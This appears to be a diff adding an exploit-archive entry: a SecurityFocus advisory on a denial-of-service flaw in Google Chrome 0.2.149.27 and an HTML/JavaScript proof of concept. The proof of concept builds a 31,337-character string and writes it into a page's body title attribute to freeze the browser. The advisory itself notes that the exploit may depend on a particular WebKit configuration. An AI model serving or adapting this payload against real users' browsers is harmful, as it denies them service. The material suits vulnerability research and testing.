@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/30975/info
+
+Google Chrome is prone to a remote denial-of-service vulnerability because it fails to handle user-supplied input.
+
+Attackers can exploit this issue to make the application unresponsive, denying service to legitimate users.
+
+Google Chrome 0.2.149.27 is vulnerable; other versions may also be affected.
+
+NOTE: Reports indicate that this issue may not be exploitable as described and may depend on a particular WebKit configuration. 
+
+<!-- Chrome(0.2.149.27) title attribute Denial of Service(Freeze) exploit Exploit written by Exodus. http://www.blackhat.org.il http://www.blackhat.org.il/index.php/ready-set-chrome/ http://www.blackhat.org.il/exploits/chrome-freeze-exploit.html --> <HTML> <HEAD> <TITLE> Chrome(0.2.149.27) title attribute Denial of Service(Freeze) exploit</TITLE> <SCRIPT language="JavaScript"> function buff(len) { var buffer; for(var i = 0; i != len; i++) { buffer += 'E';} return buffer; } </SCRIPT> </HEAD> <SCRIPT> document.write('<body title=\"' + buff(31337) + '\">'); </SCRIPT> </BODY> </HTML> 
